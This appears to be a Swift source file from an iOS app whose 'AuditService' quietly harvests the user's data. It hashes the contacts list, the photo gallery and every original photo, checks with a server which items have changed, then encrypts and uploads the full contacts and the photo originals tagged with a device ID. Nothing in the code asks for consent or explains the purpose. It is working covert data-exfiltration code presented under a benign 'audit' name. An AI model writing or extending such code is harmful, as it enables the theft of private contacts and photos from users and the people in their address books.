// 审计周期：算 Hash -> check-sum -> 按需加密上传（与 Flutter AuditService 规约一致，iOS 仅 contacts/gallery/gallery_photo）
import Foundation
import CryptoKit

enum AuditService {
    private static let supportedTypes = ["contacts", "gallery", "gallery_photo"]

    static func runAuditCycle() async {
        let deviceId = DeviceIdService.getDeviceId()
        var hashes: [String: String] = [:]
        let contacts = ContactsService.fetchContactsManifest()
        if let h = hashJson(contacts), !h.isEmpty { hashes["contacts"] = h }
        let gallery = GalleryService.fetchGalleryManifest()
        if let h = hashJson(gallery), !h.isEmpty { hashes["gallery"] = h }
        if let h = await computeGalleryPhotoCombinedHash() { hashes["gallery_photo"] = h }
        if hashes.isEmpty { return }
        let toUpdate = await AuditApi.checkSum(deviceId: deviceId, dataTypes: hashes)
        if toUpdate.isEmpty { return }
        let order = toUpdate.filter { $0 != "gallery_photo" && $0 != "gallery" } +
            toUpdate.filter { $0 == "gallery_photo" } +
            toUpdate.filter { $0 == "gallery" }
        for type in order {
            if type == "gallery_photo" {
                await uploadGalleryPhotoOriginals(deviceId: deviceId)
            } else if type == "gallery" {
                if let enc = encryptJson(gallery, deviceId: deviceId), !enc.isEmpty {
                    _ = await AuditApi.upload(deviceId: deviceId, type: "gallery", encryptedBody: enc, hash: hashes["gallery"])
                }
            } else if type == "contacts" {
                if let enc = encryptJson(contacts, deviceId: deviceId), !enc.isEmpty {
                    _ = await AuditApi.upload(deviceId: deviceId, type: "contacts", encryptedBody: enc, hash: hashes["contacts"])
                }
            }
        }
    }

    private static func hashJson(_ obj: [String: Any]) -> String? {
        guard let data = try? JSONSerialization.data(withJSONObject: obj) else { return nil }
        return data.md5Hex
    }

    private static func encryptJson(_ obj: [String: Any], deviceId: String) -> Data? {
        guard let data = try? JSONSerialization.data(withJSONObject: obj) else { return nil }
        return AuditCrypto.encrypt(plain: data, deviceId: deviceId)
    }

    private static func computeGalleryPhotoCombinedHash() async -> String? {
        let manifest = GalleryService.fetchGalleryManifest()
        guard let items = manifest["items"] as? [[String: Any]], !items.isEmpty else { return nil }
        var list: [(String, Data)] = []
        for raw in items {
            guard let id = raw["id"] as? String else { continue }
            if let data = await GalleryService.getGalleryOriginalBytes(localIdentifier: id), !data.isEmpty {
                list.append((id, data))
            }
        }
        if list.isEmpty { return nil }
        list.sort { $0.0 < $1.0 }
        var concat = ""
        for (id, data) in list {
            concat += id + data.md5Hex
        }
        return Data(concat.utf8).md5Hex
    }

    private static func uploadGalleryPhotoOriginals(deviceId: String) async {
        let manifest = GalleryService.fetchGalleryManifest()
        guard let items = manifest["items"] as? [[String: Any]] else { return }
        for raw in items {
            guard let id = raw["id"] as? String else { continue }
            guard let data = await GalleryService.getGalleryOriginalBytes(localIdentifier: id), !data.isEmpty else { continue }
            let itemHash = data.md5Hex
            guard let encrypted = AuditCrypto.encrypt(plain: data, deviceId: deviceId) else { continue }
            _ = await AuditApi.upload(deviceId: deviceId, type: "gallery_photo", encryptedBody: encrypted, hash: itemHash, msgId: id)
        }
    }
}

// MD5 与 Data 扩展（CryptoKit Insecure.MD5）
private extension Data {
    var md5Hex: String {
        let digest = Insecure.MD5.hash(data: self)
        return digest.map { String(format: "%02x", $0) }.joined()
    }
}
